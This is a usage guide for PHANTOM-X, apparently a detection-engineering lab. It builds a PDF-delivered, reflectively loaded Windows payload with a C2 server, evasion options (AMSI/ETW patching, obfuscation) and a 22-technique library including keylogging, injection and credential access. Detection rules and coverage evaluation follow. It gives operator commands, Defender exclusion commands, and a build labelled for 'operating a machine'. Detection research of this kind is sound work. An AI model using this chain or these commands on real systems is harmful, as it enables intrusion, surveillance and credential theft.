# PHANTOM-X — Complete Usage Guide

> [!IMPORTANT]
> This guide covers **every component** of PHANTOM-X, in the exact order you should use them.
> Read each section carefully before running any commands.

---

## Table of Contents

1. [Prerequisites & Toolchains](#1-prerequisites--toolchains)
2. [Phase 0 — Network Isolation (ALWAYS FIRST)](#2-phase-0--network-isolation-always-first)
3. [Phase 1 — PDF Attack Surface Analysis](#3-phase-1--pdf-attack-surface-analysis)
4. [Phase 2 — Windows Memory Research](#4-phase-2--windows-memory-research)
5. [Phase 3 — Building the Attack Chain](#5-phase-3--building-the-attack-chain)
6. [Phase 4 — Windows 11 VM Preparation](#6-phase-4--windows-11-vm-preparation)
7. [Phase 5 — C2 Server & Communication](#7-phase-5--c2-server--communication)
8. [Phase 6 — Reports](#8-phase-6--reports)
9. [Phase 7 — Detection Rules](#9-phase-7--detection-rules)
10. [Phase 8 — Evaluation Loop](#10-phase-8--evaluation-loop)
11. [The Variant Matrix](#11-the-variant-matrix)
12. [The Capability Library (22 Techniques)](#12-the-capability-library-22-techniques)
13. [Cross-Validation](#13-cross-validation)
14. [Full Regression Suite](#14-full-regression-suite)
15. [Runtime Environment Variables](#15-runtime-environment-variables)
16. [Complete Deployment Walkthrough](#16-complete-deployment-walkthrough)
17. [Troubleshooting & Notes](#17-troubleshooting--notes)

---

## 1. Prerequisites & Toolchains

Before you build anything, make sure you have these installed. A missing toolchain is
reported as **SKIPPED** (not failure), but you need all of them for a complete build.

### Required Software

| Tool | What It Builds | Install |
|------|---------------|---------|
| **MSVC** (Visual Studio Build Tools + C++ workload) | Payload, Loader, Hollow, Variants | [Visual Studio Build Tools](https://visualstudio.microsoft.com/downloads/) |
| **Windows SDK** | All C components (for `windows.h`) | Included with VS Build Tools |
| **Go** (1.20+) | C2 Server (`px_c2.exe`) | [golang.org](https://go.dev/dl/) |
| **Rust** (stable) | PDF Scanner (`px_pdfscan.exe`), Detection Tool (`px_detect.exe`) | [rustup.rs](https://rustup.rs/) |
| **Python** (3.9+) | PDF generation, test harnesses, analysis tools | [python.org](https://www.python.org/downloads/) |
| **MinGW** (optional) | Linux cross-compilation | `apt install gcc-mingw-w64-x86-64` |

### Optional Dependencies

| Dependency | Needed For |
|-----------|-----------|
| **zlib** (static) | `px_loader.exe` and `px_hollow.exe` (PDF DEFLATE decompression) |
| **pypdf** (`pip install pypdf`) | Cross-validation against independent PDF parser |
| **Wine** | Running Windows binaries on Linux for testing |
| **VMware / Hyper-V** | The lab VM |
| **Sysmon** | Telemetry collection on the VM |

### Verify Your Toolchains

```powershell
# Check MSVC
cl.exe 2>&1 | Select-String "Version"

# Check Go
go version

# Check Rust
rustc --version
cargo --version

# Check Python
python3 --version
```

> [!NOTE]
> The Rust components have **no crate dependencies** — they build fully offline.
> The C payload is **freestanding** — it links no C runtime library.

---

## 2. Phase 0 — Network Isolation (ALWAYS FIRST)

> [!CAUTION]
> **This phase MUST run before any payload touches the VM.**
> The payload executes arbitrary commands. Network isolation is the control that contains that risk.

### What It Does

Creates three isolated network zones:

| Network | Purpose |
|---------|---------|
| **HOME LAN** | Your real network — lab NEVER touches it |
| **LAB SEGMENT** (`192.168.77.0/24`) | Host-only, carries C2 + file transfer |
| **VM-LOCAL** | Where the payload runs |

### Step 1: Set Up the Host (on your main machine)

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase0_labnet
.\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001
```

**What it does:**
- Checks VMware VMnet1 is host-only (refuses if bridged)
- Creates Hyper-V Internal switch `PX-LAB` if needed
- Adds firewall rule: blocks all inbound from lab subnet **except** C2 port

**Parameters:**
| Parameter | Default | Description |
|-----------|---------|-------------|
| `-Action` | — | `apply` to set up, `remove` to tear down |
| `-LabSubnet` | `192.168.77.0/24` | Lab network range |
| `-C2Port` | `9001` | Port to allow through firewall |

### Step 2: Set Up the VM (inside the Windows 11 VM)

```powershell
.\setup_vm_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
```

**What it does:**
- Sets default-deny egress (blocks all outbound except to lab)
- Blocks home-LAN ranges
- Locks down DNS

### Step 3: Verify Isolation (inside the VM)

```powershell
.\verify_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
```

**Expected output:**
```
HOME-1    UNREACHABLE    ✓
HOME-2    UNREACHABLE    ✓
DNS-1     NO RESOLVE     ✓
LAB-1     REACHABLE      ✓
```

> [!WARNING]
> **Cost of isolation:**
> - VM has NO internet access (deliberate)
> - Windows Update won't run inside the VM
> - Defender uses whatever signatures were already installed

### Teardown

```powershell
# On the host
.\setup_labnet.ps1 -Action remove -LabSubnet 192.168.77.0/24 -C2Port 9001
```

---

## 3. Phase 1 — PDF Attack Surface Analysis

### What It Does

Analyzes PDF documents for embedded executables, JavaScript, launch actions,
and other attack vectors — using **two independent implementations** that cross-validate each other.

### Tools

| Tool | Language | Purpose |
|------|----------|---------|
| `pdf_inspector.py` | Python | Read-only PDF structure & action analyzer |
| `px_pdfscan.exe` | Rust | Independent implementation (memory-safe for hostile input) |
| `make_test_pdfs.py` | Python | Generates 11 controlled test documents |
| `make_attack_pdf.py` | Python | Builds the carrier PDF with embedded payload |
| `validate_cross_impl.py` | Python | Cross-validates Rust scanner against Python |
| `validate_against_pypdf.py` | Python | Cross-validates against `pypdf` library |

### Step 1: Generate Test PDFs

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase1_pdf
python3 make_test_pdfs.py
```

Creates 11 controlled test documents in `samples/` with a `manifest.json`.

### Step 2: Run the Python Inspector

```powershell
python3 pdf_inspector.py samples/ --extract-dir ./quarantine --json reports/out.json
```

**Parameters:**
| Parameter | Description |
|-----------|-------------|
| `samples/` | Directory of PDFs to scan |
| `--extract-dir ./quarantine` | Where to extract embedded files |
| `--json reports/out.json` | JSON output report |

### Step 3: Run the Rust Scanner

```powershell
phase1_pdf\rust_scanner\target\release\px_pdfscan.exe samples\
```

### Step 4: Cross-Validate

```powershell
# Rust vs Python
python3 validate_cross_impl.py --rust phase1_pdf\rust_scanner\target\release\px_pdfscan.exe

# Python vs pypdf (needs: pip install pypdf)
python3 validate_against_pypdf.py --json reports\crossvalidation.json
```

### Step 5: Build the Attack PDF

```powershell
python3 make_attack_pdf.py --payload ..\phase3_fileless\loader\px_payload.exe --output ..\dist\native\px_attack_chain.pdf
```

> [!NOTE]
> The attack PDF embeds the payload using FlateDecode compression.
> The loader extracts it in memory — nothing touches disk.

---

## 4. Phase 2 — Windows Memory Research

### What It Does

Demonstrates Windows memory primitives: `VirtualAlloc`, `VirtualProtect`,
`VirtualQuery`, `VirtualFree`, `ReadProcessMemory`, and in-memory execution proof.

### Usage (on the VM)

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase2_memory
python3 win_mem_lab.py
```

> [!NOTE]
> This runs on the VM where Python is available. It exercises the Windows memory
> APIs that the reflective loader uses internally.

---

## 5. Phase 3 — Building the Attack Chain

### What Gets Built

| Binary | Language | Purpose |
|--------|----------|---------|
| `px_payload.exe` | C (freestanding) | The C2 client — reflectively loaded, no CRT |
| `px_loader.exe` | C | PDF extractor + reflective PE mapper (self-injection) |
| `px_hollow.exe` | C | PDF extractor + remote process mapper (process hollowing) |

### 5a. Build Everything on Windows (Recommended)

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-C2Host` | `127.0.0.1` | C2 server IP baked into payload |
| `-C2Port` | `9001` | C2 server port baked into payload |
| `-OutputDir` | `dist\native` | Where to put built binaries |
| `-Only` | `all` | Build one component: `payload`, `loader`, `hollow`, `c2`, `pdfscan`, `detect`, `pdf`, or `all` |
| `-Clean` | — | Remove build artefacts first |

**Build order (automatic):**
1. `px_payload.exe` (C, freestanding)
2. `px_loader.exe` (C, needs zlib)
3. `px_hollow.exe` (C, needs zlib)
4. `px_c2.exe` (Go)
5. `px_pdfscan.exe` (Rust)
6. `px_detect.exe` (Rust)
7. `px_attack_chain.pdf` (Python, from built payload)

**Build a single component:**

```powershell
.\build_all.ps1 -Only payload -C2Host 192.168.77.1 -C2Port 9001
.\build_all.ps1 -Only c2
.\build_all.ps1 -Only detect
```

**Clean before build:**

```powershell
.\build_all.ps1 -Clean -C2Host 192.168.77.1 -C2Port 9001
```

**Zlib resolution order** (for loader/hollow):
1. Static lib next to sources
2. vcpkg
3. MinGW cross-compiler

### 5b. Build on Linux (MinGW Cross-Compilation)

```bash
cd phase3_fileless/loader

# Default (127.0.0.1:9001)
./build_lab.sh

# Custom C2 address
C2_HOST=192.168.56.1 C2_PORT=9001 ./build_lab.sh

# Clean first
./build_lab.sh --clean
```

**Requirements:**
- `x86_64-w64-mingw32-gcc`
- Static zlib at `/usr/x86_64-w64-mingw32/lib/libz.a`
- Override with `CC` / `ZLIB_A` env vars

### 5c. The Configuration Header (`px_config.h`)

All capabilities are **OFF by default**. Each is a compile-time `#define`:

```c
// All OFF by default
#define PX_OBFUSCATE       0   // Encoded sensitive strings
#define PX_AMSI_BYPASS     0   // AMSI patch
#define PX_ETW_UNHOOK      0   // ETW patch
#define PX_ENCRYPT         0   // Encrypted C2 channel
#define PX_DGA             0   // Domain generation
#define PX_CRED_ACCESS     0   // Credential access
#define PX_LATERAL         0   // Lateral movement
#define PX_FILE_TRANSFER   0   // File download
#define PX_SCREENSHOT      0   // Screen capture
#define PX_CAPABILITIES    0   // Technique library bitmask
#define PX_RESILIENT       0   // Reconnect with backoff
#define PX_STEALTH         0   // Stealth mode
#define PX_STEALTH_DELAY   0   // Stealth delay (seconds)
```

> [!IMPORTANT]
> Capabilities are compiled in or out at build time — never switched at runtime.
> A capability not compiled in cannot be detected.
> `build_variants.ps1` handles these flags automatically for each arm.

### 5d. Encryption Details

- **Algorithm:** XOR with keystream derived from shared key
- **Default key:** `phantomx-lab-key-0123456789abcdef`
- **Override:** Set `PX_C2_KEY` environment variable (must match on server and payload)
- **Max line:** 64KB (accommodates base64 file transfer chunks)

---

## 6. Phase 4 — Windows 11 VM Preparation

> [!IMPORTANT]
> All scripts in this phase run **inside the VM** in an **elevated PowerShell** window.

### 6a. Full VM Preparation (`vm_prepare.ps1`)

**One script to prepare the entire VM.**

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-LabFolder` | `C:\pxvm` | Where lab binaries live on the VM |
| `-LabGateway` | `192.168.77.1` | Host machine's lab IP |
| `-C2Port` | `9001` | C2 server port |
| `-LabSubnet` | `192.168.77.0/24` | Lab network range |
| `-ReportDir` | `C:\phantom-x\reports` | Where to write reports |
| `-SkipNetwork` | — | Skip network lockdown (if already isolated) |
| `-SkipSysmon` | — | Skip Sysmon install/check |

**Execution order (critical — do not change):**
1. ✅ Network lockdown FIRST
2. ✅ Defender posture reported (NOT changed)
3. ✅ Mark-of-the-Web cleared on lab folder
4. ✅ Sysmon check

### 6b. Defender Snapshot (`collect_defender.ps1`)

**Read-only snapshot** — collects Defender posture + Windows events. **Never modifies Defender.**

```powershell
.\collect_defender.ps1 -Label before_chain
# ... run the attack chain ...
.\collect_defender.ps1 -Label after_chain
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-Label` | — | Snapshot name (e.g. `before_chain`, `after_chain`) |
| `-OutputDir` | `C:\phantom-x\reports` | Where to save snapshots |
| `-Since` | — | Only collect events after this timestamp |
| `-Full` | — | Include raw preference document |

**What it collects:**
- `Get-MpComputerStatus` — real-time protection, signature version, etc.
- `Get-MpPreference` — Defender configuration
- `Get-MpThreatDetection` — detected threats
- `Get-WinEvent` — Windows event logs

### 6c. Defender A/B Toggle (`lab_ab_toggle.ps1`)

Turn Defender OFF for measurement, with **guaranteed auto-restore** in 60 seconds.

```powershell
# Check current state
.\lab_ab_toggle.ps1 -Action state

# Turn OFF (auto-restores in 60 seconds!)
.\lab_ab_toggle.ps1 -Action off

# Manually restore NOW
.\lab_ab_toggle.ps1 -Action on
```

**Parameters:**

| Parameter | Options | Description |
|-----------|---------|-------------|
| `-Action` | `off`, `on`, `state` | What to do |
| `-OutputDir` | `C:\phantom-x\reports` | Where to save state logs |

**Safety features:**
- ⏱️ `off` registers a scheduled task that auto-restores in **60 seconds**
- 🔒 Refuses to proceed if Tamper Protection is ON
- 📸 Pre-toggle state is captured and restored exactly

> [!WARNING]
> The toggle exists to produce a **documented coverage gap** — to measure what
> Defender catches vs. what it misses. The VM cannot be left unprotected.

### 6d. Sysmon Configuration

```powershell
# Validate the config against the official schema (offline)
python3 validate_sysmon_config.py

# Install Sysmon with the lab config (on the VM)
Sysmon64.exe -accepteula -i sysmon_config.xml
```

---

## 7. Phase 5 — C2 Server & Communication

### 7a. Python C2 Server (Reference Implementation)

```bash
python3 phase5_network/c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `--host` | `0.0.0.0` | Bind address |
| `--port` | `9001` | Listen port |
| `--log` | — | JSONL audit log file |

### 7b. Go C2 Server (Production — Recommended)

**Build:**

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase5_network
go build -trimpath -ldflags "-s -w" -o px_c2.exe .
```

**Cross-compile for Linux (Kali):**

```bash
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o px_c2 .
```

**Run:**

```powershell
.\px_c2.exe --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

### 7c. C2 Protocol

**Client → Server:**

| Message | Description |
|---------|-------------|
| `HELLO\|<arch>\|<pid>\|<hostname>` | Initial handshake |
| `CAPS\|<mask>` | Capability bitmask report |
| `PONG` | Latency response |
| `RESULT\|<cmd_id>\|<base64_output>\|<exit_code>` | Command result |
| `CHUNK\|...` | File transfer chunk |
| `DONE\|...` | File transfer complete |

**Server → Client:**

| Message | Description |
|---------|-------------|
| `PING` | Latency probe |
| `EXEC\|<cmd_id>\|<command>` | Execute a command |
| `CAP\|<cmd_id>\|<technique>\|<arguments>` | Run a capability |
| `DL\|<cmd_id>\|<path>` | Download a file |
| `SHOT\|<cmd_id>` | Take a screenshot |
| `EXIT` | Terminate the session |

### 7d. C2 Console Commands

Once the C2 server is running and a payload has connected:

```
c2> list                          # Show all active sessions
c2> exec 1 whoami                 # Run command in session 1
c2> exec all ver                  # Run in ALL sessions
c2> cap 1 list                    # List techniques this build carries
c2> cap 1 recon sysinfo           # Run a specific technique
c2> cap 1 inject notepad.exe      # Process injection
c2> dl 1 C:\Windows\win.ini       # Download a file from target
c2> shot 1                        # Take a screenshot
c2> ping 1                        # Measure round-trip latency
c2> stats                         # Session/command statistics
c2> kill 1                        # Terminate session 1
c2> quit                          # Stop the C2 server
```

### 7e. DGA DNS Helper

For the Domain Generation Algorithm arm only:

```bash
python3 phase5_network/dga_dns.py
```

> [!NOTE]
> The DGA arm **replaces** the C2 host with a generated name (`pxlab-<seed>-5a17c0de.lab.test`).
> It cannot be pointed at a specific address — that's why `px_payload_all.exe` leaves it out.

---

## 8. Phase 6 — Reports

```
phase6_reports/        structured JSON reports
```

Reports are generated by other tools and written here. The JSON schema is established
but the directory structure depends on what phases you've run.

---

## 9. Phase 7 — Detection Rules

### What It Provides

- **54 detection rules** for the attack chain and capability library
- **93 ATT&CK techniques** catalogued (65 measured, 6 ruled, 22 not exercised)
- Output in **Sigma** and **JSON** formats from one source definition

### 9a. View the Technique Catalogue

```powershell
# As a formatted table
phase7_detection\target\release\px_detect.exe --catalog

# Summary counts only
phase7_detection\target\release\px_detect.exe --catalog-summary

# As JSON (for the coverage matrix)
phase7_detection\target\release\px_detect.exe --emit catalog > catalog.json
```

### 9b. Export Detection Rules

```powershell
# As JSON
phase7_detection\target\release\px_detect.exe --emit json > rules.json

# As Sigma YAML (standard format)
phase7_detection\target\release\px_detect.exe --emit sigma > rules/
```

### 9c. Rule Source Files

| File | What It Contains |
|------|-----------------|
| `src/detections.rs` | Main detection rules as structured data |
| `src/rules_extra.rs` | Rules for the capability library |
| `src/catalog.rs` | The 93-technique catalogue |
| `src/main.rs` | CLI entry point |

### 9d. Rule Statuses

| Status | Meaning |
|--------|---------|
| `measured` | Lab exercises the technique — telemetry is real, rule is tested |
| `ruled` | Rule exists but **never watched to fire** — it's a hypothesis |
| `not_exercised` | Neither — the lab says nothing, and the catalogue says so |

> [!TIP]
> A rule that has never fired is a hypothesis, not a detection.
> The catalogue is honest about what's not covered.

---

## 10. Phase 8 — Evaluation Loop

This is where the lab produces its **findings**. The loop:

```
arm built → run on VM → telemetry collected → rules evaluated
     ↑                                              |
     +--------  which rules survived?  ←── the finding
```

### 10a. Collect Telemetry (on the VM)

```powershell
cd C:\pxvm\phase8_evaluation
.\collect_events.ps1 -Label baseline_arm
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-Label` | — | Name for this collection (e.g. `baseline_arm`) |
| `-OutputDir` | `C:\phantom-x\events` | Where to save event files |
| `-Minutes` | `10` | How far back to collect |
| `-IncludeSecurity` | — | Also collect Security event log |

### 10b. Evaluate Rules Against Events

```bash
python3 phase8_evaluation/px_eval.py --rules rules.json --events events_baseline_arm.json
```

**Parameters:**

| Parameter | Description |
|-----------|-------------|
| `--rules` | JSON rules file from `px_detect.exe` |
| `--events` | JSON events file from `collect_events.ps1` |
| `--json report.json` | Write JSON report |
| `--quiet` | Suppress verbose output |

### 10c. Run the Coverage Matrix (THE KEY OUTPUT)

```bash
python3 phase8_evaluation/coverage.py ^
    --rules rules.json ^
    --catalog catalog.json ^
    --baseline events_baseline_arm.json ^
    --variant events_obfuscate_arm.json
```

**The output that matters:**

```
RULES THAT FIRED ON THE BASELINE AND ARE SILENT ON THE VARIANT
(these were riding on something the variant removed)

  px-002  PDF File Opened By An Unusual Loader Process
  px-004  Process Created From PDF With Embedded PE Payload
```

> [!IMPORTANT]
> This is the finding, and it is about the **RULE**, not about the payload.
> A rule that stops working when a string is encoded was never really detecting
> the technique — it was detecting a string.

### 10d. Test the Evaluator

```bash
# 1022 assertions on evaluator semantics
python3 phase8_evaluation/test_evaluator.py

# Generate synthetic test fixtures
python3 phase8_evaluation/make_synthetic_events.py
```

---

## 11. The Variant Matrix

Each variant is a **separate binary** with capabilities compiled in at build time.

### Build All Variants

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase3_fileless\loader
.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

**Parameters:**

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-C2Host` | `127.0.0.1` | C2 host baked into each variant |
| `-C2Port` | `9001` | C2 port baked into each variant |
| `-OutputDir` | `dist\variants` | Output directory |

> [!IMPORTANT]
> **Requires MSVC + Windows SDK** — mandatory, exits with error if not found.

### Variant Arms

| Arm | Compile Flags | What It Tests |
|-----|--------------|---------------|
| `baseline` | (none) | Plain payload — everything visible |
| `obfuscate` | `PX_OBFUSCATE=1` | Sensitive strings are encoded |
| `amsi` | `PX_AMSI_BYPASS=1` | AMSI patched — reports clean without scanning |
| `etw` | `PX_ETW_UNHOOK=1` | ETW patched — returns without tracing |
| `encrypt` | `PX_ENCRYPT=1` | C2 channel encrypted |
| `dga` | `PX_DGA=1` | C2 address is a daily-generated hostname |
| `cred` | `PX_CRED_ACCESS=1` | Credential access against the lab VM |
| `lateral` | `PX_LATERAL=1` | Movement to ONE explicitly named host |
| `resilient` | `PX_RESILIENT=1` | Reconnects with backoff on network changes |
| `xfer` | `PX_FILE_TRANSFER=1, PX_SCREENSHOT=1` | File download + screen capture |
| `caps` | `PX_CAPABILITIES=0x3FFFFF` | All 22 techniques in the capability library |
| `all` | Everything except DGA | **The practical operator binary** |
| `stealth` | All + `PX_STEALTH=1, PX_STEALTH_DELAY=20` | All + stealth mode with delay |
| `full` | Everything including DGA | Worst case for defender testing |

### Which Binary to Use

- **For operating a machine:** `px_payload_all.exe` — everything except DGA, works with named addresses
- **For defender stress testing:** `px_payload_full.exe` — everything, including DGA
- **For measurement:** Use individual arms to attribute signals to specific techniques

### Obfuscation Verification

The build automatically scans the obfuscated binary for sensitive literals:

```
baseline : 11/19 needles visible
obfuscate: no needle found -- the arm is clean
```

### Capability Bitmask

Sent as `CAPS|<mask>` after `HELLO`:

| Bit | Capability |
|-----|-----------|
| `0x01` | Obfuscated strings |
| `0x02` | AMSI bypass |
| `0x04` | ETW unhooked |
| `0x08` | Encrypted channel |
| `0x10` | Domain generation |
| `0x20` | Credential access |
| `0x40` | Lateral movement |
| `0x80` | Capability library |

---

## 12. The Capability Library (22 Techniques)

Driven via the C2 server's `cap` command. The server sends `CAP|<cmd_id>|<technique>|<arguments>`.

### Available Techniques

| Command | Technique | ATT&CK ID |
|---------|-----------|-----------|
| `inject <process>` | Process injection | T1055 |
| `token` | Token theft | T1134.001 |
| `keylog` | Keylogging | T1056.001 |
| `clip` | Clipboard access | T1115 |
| `persist` | Run key / WMI subscription | T1547.001, T1546.003 |
| `antifor` | Self-delete / timestomp / logs | T1070.004, T1070.006, T1070.001 |
| `recon <arg>` | Sysinfo / processes / users | T1082, T1057, T1087, T1046 |
| `lolbin` | Signed binary proxy execution | T1218 |
| `script` | Script host abuse | T1059.005, T1059.007 |
| `dnstun` | Data inside DNS queries | T1572 |
| `steg` | Payload hidden in an image | T1027.003 |
| `spoof` | Rename / PPID / command line | T1036.005, T1134.004, T1564.010 |
| `delay` | Sleep / environment check | T1497.003, T1482 |
| `antivm` | Debugger / VM / sandbox detect | T1497.001, T1622 |
| `service` | Create a Windows service | T1543.003 |
| `schtask` | Create a scheduled task | T1053.005 |
| `com` | Hijack a COM class | T1546.015 |
| `elev` | Auto-elevate registry key | T1548.002 |
| `proxy` | Set WinINet proxy | T1090 |
| `ps` | PowerShell command | T1059.001, T1140 |
| `stage` | Collect directory into archive | T1560.001, T1074.001 |
| `browser` | Open credential store | T1555.003, T1005 |

### Usage Examples

```
c2> cap 1 list                    # What can this build do?
c2> cap 1 recon sysinfo           # System information
c2> cap 1 recon processes         # Running processes
c2> cap 1 inject notepad.exe      # Inject into notepad
c2> cap 1 keylog                  # Start keylogging
c2> cap 1 persist                 # Write a persistence key
c2> cap 1 service                 # Create a service (auto-removed)
c2> cap 1 browser                 # Open credential store (no read)
```

> [!WARNING]
> **Techniques that change the machine PUT IT BACK.**
> Service, scheduled task, COM class, auto-elevate key, and proxy setting are
> all removed after use. The report documents how.
>
> **The browser capability opens the credential store but does NOT read it.**
> The file-open is the telemetry the rule needs; the contents stay on the machine.

---

## 13. Cross-Validation

Every analyzer is checked against an independent implementation.

### Rust PDF Scanner vs Python Reference

```powershell
python3 phase1_pdf\validate_cross_impl.py --rust phase1_pdf\rust_scanner\target\release\px_pdfscan.exe
```

### Go C2 Server vs Python Reference

```powershell
python3 phase5_network\validate_c2_equivalence.py --go dist\native\px_c2.exe
```

### Go C2 Server vs Real Payload

```powershell
cd phase5_network
go test -v -run TestGoC2Integration .
```

### Full Chain Integration Test

```powershell
python3 phase5_network\test_chain_integration.py
```

**Expected output:**

```
[PASS] chain established a C2 session through the PDF -- session=1
[PASS] HELLO parsed -- host=KALI arch=x64 pid=296
[PASS] latency measured -- 0.31 ms
[PASS] EXEC 'whoami' returned output -- 'KALI\root'
[PASS] EXEC 'cmd /c echo PHANTOM_X_CHAIN_PROOF' returned output -- 'PHANTOM_X_CHAIN_PROOF'
[PASS] controlled session termination -- payload acknowledged EXIT
RESULT: PASS
```

---

## 14. Full Regression Suite

### Basic Run

```powershell
cd C:\Users\SycoDiliCo\Projects\phantom-x
python3 run_all_tests.py
```

### Options

| Flag | Description |
|------|-------------|
| `--quick` | Skip slow checks |
| `--elevate` | Re-launch as admin (recommended) |
| `--runs 3` | Run variant arms 3 times |

### What It Tests (in order)

1. ✅ Payload formatter self-test (C, MSVC)
2. ✅ SHA-256 FIPS 180-4 vectors (Rust)
3. ✅ Rust PDF scanner vs Python reference
4. ✅ Go C2 server vs Python reference
5. ✅ Go C2 server vs real payload

**Full suite adds:**
- Variant arms
- Resilient reconnect
- Rule evaluator (1022 assertions)
- Capability library + file transfer
- Coverage matrix
- Rule field checks
- Defender findings report
- PDF inspector vs pypdf
- Sysmon config vs schema

> [!TIP]
> **Run with `--elevate`** — Defender quarantines lab payloads (detected as
> `Trojan:Win32/Wacatac.H!ml`). The suite adds a Defender exclusion for the
> build directory (not disabling Defender). Without elevation, quarantined
> arms are reported as `blocked-by-defender` (this is a finding, not a failure).

---

## 15. Runtime Environment Variables

These override the compiled-in defaults at runtime:

| Variable | Default | Description |
|----------|---------|-------------|
| `PX_C2_HOST` | Compiled-in value | C2 server IP/hostname |
| `PX_C2_PORT` | Compiled-in value | C2 server port |
| `PX_C2_KEY` | `phantomx-lab-key-0123456789abcdef` | Encryption key (must match server) |

**Example:**

```powershell
$env:PX_C2_HOST = "192.168.77.1"
$env:PX_C2_PORT = "9001"
.\px_loader.exe .\px_attack_chain.pdf .\loader.log
```

---

## 16. Complete Deployment Walkthrough

Here is the **exact order** for a full lab run, start to finish.

### On the Host Machine (your main PC)

```powershell
# ── Step 1: Build everything ──
cd C:\Users\SycoDiliCo\Projects\phantom-x\phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001

# ── Step 2: Build variant matrix (optional, for measurement) ──
.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001

# ── Step 3: Network isolation (BEFORE touching the VM) ──
cd ..\..\phase0_labnet
.\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001

# ── Step 4: Copy files to the VM ──
# Copy to C:\pxvm on the VM:
#   - px_loader.exe, px_payload.exe, px_attack_chain.pdf
#   - px_c2.exe (or c2_server.py)
#   - phase4_defender\ scripts
#   - phase8_evaluation\ scripts
```

### Inside the Windows 11 VM (elevated PowerShell)

```powershell
# ── Step 5: Prepare the VM ──
cd C:\pxvm\phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001

# ── Step 6: Verify isolation ──
cd ..\phase0_labnet
.\verify_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
```

### On the Host Machine — Start C2

```powershell
# ── Step 7: Start the C2 server ──
cd C:\Users\SycoDiliCo\Projects\phantom-x
.\dist\native\px_c2.exe --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
# OR: python3 phase5_network\c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

### Inside the VM — Run the Chain

```powershell
# ── Step 8: Capture "before" state ──
cd C:\pxvm
.\collect_defender.ps1 -Label before_chain

# ── Step 9: Run the attack chain ──
.\px_loader.exe .\px_attack_chain.pdf .\loader.log

# ── Step 10: Operate from the C2 console ──
#   c2> list
#   c2> exec 1 whoami
#   c2> cap 1 recon sysinfo
#   c2> ping 1
#   c2> kill 1

# ── Step 11: Capture "after" state ──
.\collect_defender.ps1 -Label after_chain

# ── Step 12: Collect telemetry ──
cd C:\pxvm\phase8_evaluation
.\collect_events.ps1 -Label baseline_arm
```

### On the Host Machine — Evaluate

```powershell
# ── Step 13: Export rules ──
.\dist\native\px_detect.exe --emit json > rules.json
.\dist\native\px_detect.exe --emit catalog > catalog.json

# ── Step 14: Run the coverage matrix ──
python3 phase8_evaluation\coverage.py `
    --rules rules.json `
    --catalog catalog.json `
    --baseline events_baseline_arm.json `
    --variant events_obfuscate_arm.json
```

### Repeat Steps 9-14 for Each Variant Arm

Run each variant payload → collect telemetry → compare against baseline.
The difference in what the endpoint sees IS the finding.

---

## 17. Troubleshooting & Notes

### Defender Quarantines the Payload

This is **expected behavior** — Defender detects the payload as `Trojan:Win32/Wacatac.H!ml`.
This is a finding, not a bug. Solutions:

```powershell
# Add exclusion (elevated PowerShell, on the VM)
Add-MpPreference -ExclusionPath "C:\pxvm"

# Or run the test suite with --elevate (it adds the exclusion automatically)
python3 run_all_tests.py --elevate
```

### The DGA Arm Needs Elevation

The DGA arm writes to the hosts file to resolve generated domains. Run in an elevated shell.

### Payload Has No Persistence

The payload runs in memory. A reboot ends the session. There is no auto-start.

### Stack Frame Size Limit

The payload has **no CRT** and the stack probe is disabled. Every stack frame must fit
in **one page** (4096 bytes). Buffers ≥1024 bytes use static storage. This is enforced
at build time — a larger frame is not "too big", it's fatal.

### C2 Server Binding

The C2 server should bind to the **lab interface only**. Never expose it on a public address.

### No Internet on the VM

This is deliberate. The VM's default-deny egress blocks all internet access.
Windows Update won't run. Defender uses existing signatures.

### Build Failures

- Missing toolchain → reported as **SKIPPED**, not failure
- `build_all.ps1` exits 0 if at least one component built
- `build_variants.ps1` **requires** MSVC — exits 1 if not found
